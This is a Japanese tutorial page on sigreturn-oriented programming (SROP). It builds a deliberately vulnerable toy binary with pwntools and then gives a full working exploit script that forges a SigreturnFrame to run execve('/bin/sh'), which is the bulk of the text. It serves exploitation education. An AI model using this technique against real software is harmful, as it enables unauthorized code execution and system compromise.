# Using SROP

## ソース

[syscall](../exploitation-with-syscalls.md#the-source) のときと同様に、pwntools の ELF 機能でバイナリを作りました。

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

elf = ELF.from_assembly(
    '''
        mov rdi, 0;
        mov rsi, rsp;
        sub rsi, 8;
        mov rdx, 500;
        syscall;
        ret;
        
        pop rax;
        ret;
    ''', vma=0x41000
)
elf.save('vuln')
```

とても単純で、`read` syscall の後に `pop rax; ret` ガジェットがあるだけです。シェルを起動するのに必要な RDI/RSI/RDX は制御できないので、SROP を使うことになります。

ここでも、バイナリに `/bin/sh` を追加しました。

```bash
echo -en "/bin/bash\x00" >> vuln
```

## エクスプロイト

まず、使えるガジェットとその位置、そして `/bin/sh` の位置を書き出しておきましょう。

```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015
```

ここから先は、自分でペイロードを試してみることをおすすめします。パディングは(アセンブリを見れば分かるとおり)RIP まで `8` バイトで、その後に `sigreturn` を起動し、続けてレジスタの値を置きます。



`sigreturn` の起動は簡単です。sigreturn は syscall `0xf`(`15`)なので、それを RAX に pop して `syscall` を呼び出します。

```python
payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL_RET)
```

すると、syscall は RSP の位置にあるレジスタ値を参照します。これを偽装する必要があります。値は決まった順序で並べる必要がありますが、幸い pwntools には `SigreturnFrame()` という便利な機能があり、順序を処理してくれます。

```text
frame = SigreturnFrame()
```

あとは、レジスタの値を決めるだけです。`execve()` syscall を起動したいので、そのために必要な値をレジスタに設定します。

```python
frame.rax = 0x3b            # execve のシステムコール番号
frame.rdi = BINSH           # /bin/sh へのポインタ
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
```

ただし、これを起動するには**RIP も制御して**、`syscall` ガジェットに戻るようにして、execve が実際に実行されるようにする必要があります。

```python
frame.rip = SYSCALL_RET
```

これをペイロードに追加して送信します。

```python
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```

![Nailed it!](../../../../.gitbook/assets/image%20%2842%29.png)

### 最終的なエクスプロイト

```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # execve のシステムコール番号
frame.rdi = BINSH           # /bin/sh へのポインタ
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
